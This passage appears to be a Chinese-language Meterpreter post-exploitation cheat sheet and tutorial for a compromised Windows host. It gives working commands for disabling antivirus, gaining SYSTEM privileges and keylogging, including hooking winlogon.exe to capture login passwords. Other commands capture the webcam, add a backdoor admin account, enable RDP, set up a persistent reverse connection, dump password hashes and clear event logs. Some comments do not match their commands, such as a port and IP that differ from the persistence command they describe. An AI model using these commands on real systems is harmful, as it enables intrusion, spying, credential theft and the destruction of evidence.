    ps                  #查看目标主机进程信息
    pwd                 #查看目标当前目录(windows)
    getlwd              #查看目标当前目录(Linux)
    search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件
    download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下
    upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下
    getpid              #查看当前Meterpreter Shell的进程PID
    migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
    idletime            #查看主机运行时间
    getuid              #查看获取的当前权限
    getsystem           #提权,获得的当前用户是administrator才能成功
    run  killav         #关闭杀毒软件
    screenshot          #截图
    webcam_list         #查看目标主机的摄像头
    webcam_snap         #拍照
    webcam_stream       #开视频
    execute  参数  -f 可执行文件   #执行可执行程序
    run getgui -u hack -p 123    #创建hack用户，密码为123
    run getgui -e                #开启远程桌面
    keyscan_start                #开启键盘记录功能
    keyscan_dump                 #显示捕捉到的键盘记录信息
    keyscan_stop                 #停止键盘记录功能
    uictl  disable  keyboard     #禁止目标使用键盘
    uictl  enable   keyboard     #允许目标使用键盘
    uictl  disable  mouse        #禁止目标使用鼠标
    uictl  enable   mouse        #允许目标使用鼠标
    load                         #使用扩展库
    run                          #使用扩展库
    ​
    run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
    portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
    clearev                       #清除日志
### Post 后渗透模块
该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。
    run post/windows/manage/migrate           #自动进程迁移
    run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上
    run post/windows/manage/killav            #关闭杀毒软件
    run post/windows/manage/enable_rdp        #开启远程桌面服务
    run post/windows/manage/autoroute         #查看路由信息
    run post/windows/gather/enum_logged_on_users    #列举当前登录的用户
    run post/windows/gather/enum_applications       #列举应用程序
    run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码
    run post/windows/gather/smart_hashdump               #dump出所有用户的hash
输入：sysinfo 查看目标主机的信息
### 查看主机是否运行在虚拟机上
    run post/windows/gather/checkvm
### 关闭杀毒软件
拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：
    run  killav
### 获取目标主机的详细信息
使用命令：
    run scraper 
它将目标机器上的常见信息收集起来然后下载保存在本地
### 访问文件系统
Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下：
> > cd：切换目标目录；
>>
>> cat：读取文件内容；
>>
>> rm：删除文件；
>>
>> edit：使用vim编辑文件
>>
>> ls：获取当前目录下的文件；
>>
>> mkdir：新建目录；
>>
>> rmdir：删除目录；
### 上传/下载文件
download file 命令可以帮助我们从目标系统中下载文件
upload file 命令则能够向目标系统上传文件。
### 权限提升
有的时候，你可能会发现自己的 Meterpreter
会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个getsystem
命令，它可以使用多种技术在目标系统中实现提权：
getuid 命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为 NT AUTHORITY\SYSTEM
，这个也就是Windows的系统权限。
注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！
### 获取用户密码
传送门：[MSF中获取用户密码](https://xie1997.blog.csdn.net/article/details/105815134)
### 运行程序
先查看目标主机安装了哪些应用
run post/windows/gather/enum_applications
我们还可以使用 execute 命令在目标系统中执行应用程序。这个命令的使用方法如下：
    execute  参数  -f 可执行文件  
运行后它将执行所指定的命令。可选参数如下：
> > -f：指定可执行文件
>>
>> -H：创建一个隐藏进程
>>
>> -a：传递给命令的参数
>>
>> -i： 跟进程进行交互
>>
>> -m：从内存中执行
>>
>> -t： 使用当前伪造的线程令牌运行进程
>>
>> -s： 在给定会话中执行进程
### 屏幕截图
输入：screenshot ，截图目标主机屏幕，可以看到，图片被保存到了 /root 目录下
### 创建一个新账号
先查看目标主机有哪些用户
run post/windows/gather/enum_logged_on_users
接下来，我们可以在目标系统中创建一个新的用户账号：run getgui -u hack -p 123，这个命令会创建用户，并把他添加到
Administrators 组中，这样该用户就拥有远程桌面的权限了。
这里成功创建了用户，但是添加到Administrators组中失败了 !
如果添加到Administrators组中失败了的话，我们可以运行：shell ，进行cmd窗口手动将该用户添加到administrators组中。
### 启用远程桌面
当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。
首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），不过我们的 getgui 脚本可以帮我们搞定。我们可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启），我们输入： run getgui -e 或者 run
post/windows/manage/enable_rdp
在开启远程桌面会话之前，我们还需要使用“idletime”命令检查远程用户的空闲时长： idletime
然后我们就可以使用远程桌面用我们创建的用户远程登录目标主机了。由于上一步创建的用户没有被添加到远程桌面用户组中，所以这一步就没法演示。
### 键盘记录
Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：
> > keyscan_start：开启键盘记录功能
>>
>> keyscan_dump：显示捕捉到的键盘记录信息
>>
>> keyscan_stop：停止键盘记录功能
不过在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录
### 进程迁移
Meterpreter
既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。
在下面的例子中，我们会将Meterpreter跟 winlogon.exe 绑定，并在登录进程中捕获键盘记录，以获得用户的密码。
首先，我们需要使用： ps 命令查看目标设备中运行的进程：
我们可以使用： getpid 查看我们当前的进程id
使用： migrate 目标进程ID 命令来绑定目标进程id，这里绑定目标pid的时候，经常会断了 shell。进程迁移后会自动关闭原来进程，没有关闭可使用
kill pid 命令关闭进程。或者使用自动迁移进程（run
post/windows/manage/migrate）命令，系统会自动寻找合适的进程然后迁移。
绑定完成之后，我们就可以开始捕获键盘数据了，可以看到，用户输入了 123 然后回车，说明密码是 123
### 禁止目标主机使用键盘鼠标
· 禁止(允许)目标使用键盘： uictl disable (enable) keyboard